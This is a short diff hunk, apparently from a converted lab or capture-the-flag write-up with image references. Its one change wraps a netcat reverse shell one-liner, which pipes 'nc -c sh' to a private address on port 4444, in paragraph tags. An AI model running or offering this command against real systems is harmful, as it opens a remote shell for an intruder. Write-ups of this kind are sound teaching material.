@@ -8,7 +8,7 @@
 
 <img src="bob/media/image3.png" style="width:5.55833in;height:1.80833in" />
 
-echo nc -c sh 192.168.43.208 4444|$0
+<p>echo nc -c sh 192.168.43.208 4444|$0</p>
 
 <img src="bob/media/image4.png" style="width:5.45in;height:1.425in" />
 
